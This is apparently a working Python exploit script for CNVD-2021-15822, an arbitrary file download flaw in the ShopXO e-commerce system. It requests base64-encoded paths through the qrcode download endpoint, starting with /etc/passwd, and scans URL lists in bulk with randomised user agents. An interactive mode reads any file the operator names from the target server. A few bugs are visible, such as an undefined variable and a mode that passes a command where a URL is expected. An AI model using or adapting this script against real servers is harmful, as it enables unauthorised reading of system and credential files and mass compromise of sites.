import requests
import re
import sys
import urllib3
from argparse import ArgumentParser
import threadpool
from urllib import parse
from time import time
import random
import base64


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
filename = sys.argv[1]
url_list=[]

#随机ua
def get_ua():
	first_num = random.randint(55, 62)
	third_num = random.randint(0, 3200)
	fourth_num = random.randint(0, 140)
	os_type = [
		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
		'(Macintosh; Intel Mac OS X 10_12_6)'
	]
	chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

	ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
				  )
	return ua


def check_vuln(url):
	url = parse.urlparse(url)
	url2=url.scheme + '://' + url.netloc 
	headers = {
		'User-Agent': get_ua(),
	}
	# data=base64.b64encode("eyJzZXQtcHJvcGVydHkiOnsicmVxdWVzdERpc3BhdGNoZXIucmVxdWVzdFBhcnNlcnMuZW5hYmxlUmVtb3RlU3RyZWFtaW5nIjp0cnVlfX0=")
	try:
		res2 = requests.get(url2 + '/public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q=',headers=headers,timeout=10,verify=False)
		if res2.status_code==200 and "root:" in res2.text:
			print("\033[32m[+]%s is vuln\033[0m" %url2)
			return 1
		else:
			print("\033[31m[-]%s is not vuln\033[0m" %url1)
	except Exception as e:
		print("\033[31m[-]%s is timeout\033[0m" %url2)


#cmdshell
def cmdshell(url):
	if check_vuln(url)==1:
		url = parse.urlparse(url)
		url1 = url.scheme + '://' + url.netloc + '/public/index.php?s=/index/qrcode/download/url/'
		while 1:
			filename = input("\033[35mfilename: \033[0m")
			if filename =="exit":
				sys.exit(0)
			else:
				headers = {
					'User-Agent': get_ua(),
					}
				filenamebase=str(base64.b64encode(filename.encode("utf-8")),"utf-8")
				try:
					res = requests.get(url1 + filenamebase,headers=headers,timeout=10,verify=False)
					if res.status_code==200 and len(res.text) != 0:
						print("\033[32m%s\033[0m" %res.text)
					else:
						print("\033[31m[-]%s file does not exist !\033[0m" %url1)
				except Exception as e:
					print("\033[31m[-]%s is timeout!\033[0m" %url1)


#多线程
def multithreading(url_list, pools=5):
	works = []
	for i in url_list:
		# works.append((func_params, None))
		works.append(i)
	# print(works)
	pool = threadpool.ThreadPool(pools)
	reqs = threadpool.makeRequests(check_vuln, works)
	[pool.putRequest(req) for req in reqs]
	pool.wait()


if __name__ == '__main__':
	show = r'''

	 _____  _   _ _   _______        _____  _____  _____  __        __   _____ _____  _____  _____ 
	/  __ \| \ | | | | |  _  \      / __  \|  _  |/ __  \/  |      /  | |  ___|  _  |/ __  \/ __  \
	| /  \/|  \| | | | | | | |______`' / /'| |/' |`' / /'`| |______`| | |___ \ \ V / `' / /'`' / /'
	| |    | . ` | | | | | | |______| / /  |  /| |  / /   | |______|| |     \ \/ _ \   / /    / /  
	| \__/\| |\  \ \_/ / |/ /       ./ /___\ |_/ /./ /____| |_     _| |_/\__/ / |_| |./ /___./ /___
	 \____/\_| \_/\___/|___/        \_____/ \___/ \_____/\___/     \___/\____/\_____/\_____/\_____/
	                                                                                               
                                                                                               
                                                                                                      
                              		                     ShopXo 任意文件下载 By m2
	'''
	print(show + '\n')
	arg=ArgumentParser(description='CNVD-2021-15822 By m2')
	arg.add_argument("-u",
						"--url",
						help="Target URL; Example:http://ip:port")
	arg.add_argument("-f",
						"--file",
						help="url_list; Example:url.txt")
	arg.add_argument("-c",
					"--cmd",
					help="command; Example:whoami")
	args=arg.parse_args()
	url=args.url
	filename=args.file
	cmd=args.cmd
	print('[*]任务开始...')
	if url != None and cmd == None and filename == None:
		check_vuln(url)
	elif url == None and cmd == None and filename != None:
		start=time()
		for i in open(filename):
			i=i.replace('\n','')
			check_vuln(i)
		end=time()
		print('任务完成，用时%d' %(end-start))
	elif url == None and cmd != None and filename == None:
		cmdshell(cmd)
